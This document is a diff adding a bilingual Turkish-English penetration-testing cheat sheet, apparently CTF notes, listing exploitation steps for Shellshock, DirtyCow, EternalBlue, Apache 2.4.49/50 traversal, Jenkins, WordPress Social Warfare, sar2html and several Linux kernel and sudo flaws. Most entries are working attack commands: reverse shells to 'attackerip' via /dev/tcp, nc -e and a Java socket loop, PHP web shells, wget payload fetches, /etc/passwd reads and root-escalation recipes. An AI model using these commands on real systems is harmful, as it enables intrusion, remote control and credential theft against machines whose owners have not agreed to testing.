@@ -1,0 +1,180 @@
+--SHELLSHOCK--
+CGİ-BİN/TESH.CGİ => SHELLSHOCK ZAAFİYETİ ( detection of shellshock security vuln)
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec)
+
+nikto sonucu shellshock zaafiyeti varsa searchsploit dosyası çalışır.(we can find the shellshock vuln from nikto scan and execute searchsploit file)
+ip/cgi-bin/test/test.cgi olarak denenir.(try this for verification)
+php 34766.php -u http://sitename.local/cgi-bin/test/test.cgi -c 'bash -i >& /dev/tcp/attackerip/port 0>&1'
+nc -lvnp port
+
+--3.2.0-23 uname-r dirtycow--
+https://github.com/FireFart/dirtycow/blob/master/dirty.c => download this file
+dosyayı dirtycow.c olarak kaydet => save the file name is dirtycow.c
+wget ile at karşıya => upload with wget
+gcc -pthread dirty.c -o dirty -lcrypt => compile with
+./dirty password => add a new password
+bekle ve talimatları izleyip yeni kullanıcı ekle password ile giriş yap root al. => add a new user and password and login
+
+--Koken CMS 0.22.24 - Keyfi Dosya Yükleme--
+1. Create a malicious PHP file with this content:
+
+   <?php system($_GET['cmd']);?>
+
+2. Save as "image.php.jpg"
+
+3. Authenticated, go to Koken CMS Dashboard, upload your file on "Import Content" button (Library panel) and send the HTTP request to Burp.
+
+4. On Burp, rename your file to "image.php"
+
+
+webshelllerden simple shell cmd get php ekleyen sheli yükleyip jpg silip php olarak forward edince php yüklüyor.
+http://ip:8000/storage/originals/81/a2/simple-backdoor.php?cmd=pwd => çalışıyor.
+koken cms yüklüyse admin paneline /admin ile erişilir. şifre ve email muhtemelen smb vs. saklıdır.
+
+--CHKROOTKIT-0.49-ZAAFİYETİ--
+CVE:2014-0476
+https://www.exploit-db.com/exploits/33899
+crontab -l de script dosyasında bu zafiyet olabilir.veya(root değilse gözükmez.)
+pspy64 ile çalıştırılan dosya chkrootkit sonucu döndürüyorsa.
+KARŞI TARAFTA(ON THE TARGET)
+username@hostname:/tmp$ echo 'nc ATTACKERIP -e /bin/bash' > /tmp/update 
+chmod +x update 
+./update
+ls -ltrf => çalışan işlem kontrol (control working process)
+nc -lvnp 4242 => root verir biraz bekleyince(get the root)
+
+--Linux ubuntu 3.13.0-32-generic--(linux version vulnerability)
+uname -a => exploit:linux kernel 3.13.0 < 3.19 (ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs'
+searchsploit => linux/local/37292.c => gcc 37292.c -o exploit => karşı makinada(on the target) chmod +x ve(and) ./exploit => root.
+
+--LXD =>ROOT--
+KAYNAK=>book.hacktricks.xyz=>SOURCE
+# build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+sudo ./build-alpine -a i686
+
+# import the image
+lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
+
+# before running the image, start and configure the lxd storage pool as default 
+lxd init
+
+# run the image
+lxc init myimage mycontainer -c security.privileged=true
+
+# mount the /root into the image
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+
+# interact with the container
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+
+ROOT ALIR	=>(GET THE ROOT)
+
+--11211=>MEMCACHED ESCALATE--
+11211=>MEMCACHED ESCALATE
+/usr/share/memcached/scripts/memcached-tool localhost:11211 dump=> bu komutla bellek bastırılır. (dump the memory)
+locate memcached-tool=>yerini bul hedefte=> (find the tool location on the target system)
+tespiti için=>etstat -tplan=>11211 açıksa kullan.(for detection)
+
+--MSQL RCE EKLEME--(ADD RCE IN MYSQL)
+select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
+curl 127.0.0.1:8080/shell.php?cmd=whoami => id www-data verir. (response is ww-data)
+
+--ETERNALBLUE MS17-010--
+msfconsole search eternalblue => exploit/windows/smb/ms17-010-eternalblue
+hashdump=>root isek hashleri verir.(if we are root this command get the all hashes)
+
+--Apache 2.4.49-50 CGİ--
+CGI etkin olmadan Apache 2.4.49
+curl -v 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
+
+etkin
+curl -v 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"
+
+Apaçi 2.4.50
+curl 'http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+
+--UNİFİ-6.4.54-LOG4J--
+https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi
+
+--JENKİNS GROOVY SCRİPT--
+WEB SAYFA YAZILIMINDAKİ SCRİPT AÇIĞI(web page software vuln)
+ROOT:PASSWORD
+
+String host="attackerip";
+int port=4444;
+String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+nc -lvnp 4444
+
+--Social Warfare <= 3.5.2--
+1. Create payload file and host it on a location accessible by a targeted website. Payload content : "<pre>system('cat /etc/passwd')</pre>"
+2. Visit http://WEBSITE/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt
+3. Content of /etc/passwd will be returned
+4. rce olduğundan dosya upload edip reverse shell alınır.=>(reverse shell with rce)
+5.revshell.php karşıya yüklemek için  =>  <pre>system('wget http://attackerip:8383/revshell.php')</pre>
+6.ulaşmak için http://targetip/wordpress/wp-admin/revshell.php
+------------------------
+wpscan --url http://targetip/wordpress => detection
+
+--Dirtycow2--
+linux-exploit-suggester sonucu çıktıysa açık(linux-exploit-suggester detected this vuln)
+
+[+] [CVE-2016-5195] dirtycow
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: highly probable
+   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
+   Download URL: https://www.exploit-db.com/download/40611
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: highly probable
+   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+   
+--Drupal 7.x--
+drupalgeddon2 açığı ruby dosyası var searchsploitte(we have ruby file in searchsploit)
+searchsploit drupalgeddon2
+
+--sar2html 3.2.1--
+dosya upload edip çalıştırılabilir.(we can file upload and execute it)
+http://<ipaddr>/index.php?plot=;<command-here> will execute 
+
+http://targetip/sar2HTML/index.php?plot=;wget http:://attackerip:8383/revshell.php
+http://targetip/sar2HTML/index.php?plot=;chmod 777 revshell.php
+http://targetip/sar2HTML/index.php?plot=;chmod 777 revshell.php
+
+--3.13.0-32-generic--
+linpeas veya uname -a -r sonucu 3.13.0-32-generic çıkarsa
+searchsploit 3.13.0
+37292.c indir.(download this file)
+karşıya at(upload to target)
+gcc 37292.c -o genericexploit => çıkart(compile)
+./genericexploit => root.
+
+--sudo 1-8-21-p2 exploit--
+sudo --version 1.8.21.p2 => CVE 2021-3156
+
+https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
+
+--4.4.0-21-generic--
+https://www.exploit-db.com/exploits/39772 => txt içinde link var(there is a link in txt file)
+wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+unzip 39772.zip
+tar -xf exploit.tar
+cd ebpf_mapfd_doubleput_exploit/
+./compile.sh
+./doubleput => root
+
+
+
+
